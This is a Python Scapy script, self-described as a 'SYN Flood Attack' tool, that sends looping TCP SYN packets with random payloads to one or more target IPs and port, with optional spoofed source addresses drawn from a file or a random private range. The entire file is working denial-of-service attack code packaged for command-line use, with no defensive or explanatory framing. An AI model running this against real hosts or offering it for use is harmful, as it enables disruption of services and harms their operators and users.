from scapy.all import *
import argparse
import random


def send_syn_packet(target_ip, source_ip, target_port, iterations, count):
    ip = IP(dst=target_ip, src=source_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandShort())

    # add some flooding data
    raw = Raw(RandString(RandNum(1, 1024)))

    # Craft the SYN packet with source IP address
    syn_packet = ip / tcp / raw

    # Send the SYN packets in a loop
    for _ in range(iterations):
        send(syn_packet, count=count)
        
def send_syn_packet_rand_list(target_ip, source_ip, target_port, iterations, count):
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandShort())

    # add some flooding data
    raw = Raw(RandString(RandNum(1, 1024)))

    # Send the SYN packets in a loop
    for _ in range(iterations):
        for _ in range(count):
            dst = target_ip if type(target_ip) == str else random.choice(target_ip)
            src = source_ip if type(source_ip) == str else random.choice(source_ip)
            ip = IP(dst=dst, src=src)
            # Craft the SYN packet with source IP address
            syn_packet = ip / tcp / raw
            send(syn_packet, verbose=0)
        print("Sent", count, "packets to", target_ip)

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="SYN Flood Attack")
    parser.add_argument("-t", "--target-ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--target-port", type=int, default=80, help="Target port number")
    parser.add_argument("-s", "--source-ip", help="Source IP address")
    parser.add_argument("-tf", "--target-ip-file", help="File containing target IP addresses")
    parser.add_argument("-sf", "--source-ip-file", help="File containing source IP addresses")
    parser.add_argument("-c", "--count", type=int, default=1, help="Number of packets to send")
    parser.add_argument("-i", "--iterations", type=int, default=1, help="Number of iterations")
    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.target_port
    source_ip = args.source_ip
    target_ip_file = args.target_ip_file
    source_ip_file = args.source_ip_file
    count = args.count
    iterations = args.iterations


    # If target IP is not provided and target IP file is provided, read target IPs from file
    if target_ip is None and target_ip_file is not None:
        with open(target_ip_file, "r") as file:
            target_ips = file.read().splitlines()
        if len(target_ips) > 0:
            target_ip = target_ips
        else:
            print("No target IP addresses found in file.")
            exit(1)


    # If source IP is not provided and source IP file is provided, read source IPs from file
    if source_ip is None and source_ip_file is not None:
        with open(source_ip_file, "r") as file:
            source_ips = file.read().splitlines()
        if len(source_ips) > 0:
            source_ip = source_ips
        else:
            print("No source IP addresses found in file.")
            print("Using random source IP address.")

    # If source IP is not provided or source IP file is not provided, use machine's IP address
    if source_ip is None:
        source_ip = RandIP("192.168.1.1/24")
    
    if source_ip_file or target_ip_file:
        send_syn_packet_rand_list(target_ip, source_ip, target_port, iterations, count)
    else:
        send_syn_packet(target_ip, source_ip, target_port, iterations, count)

    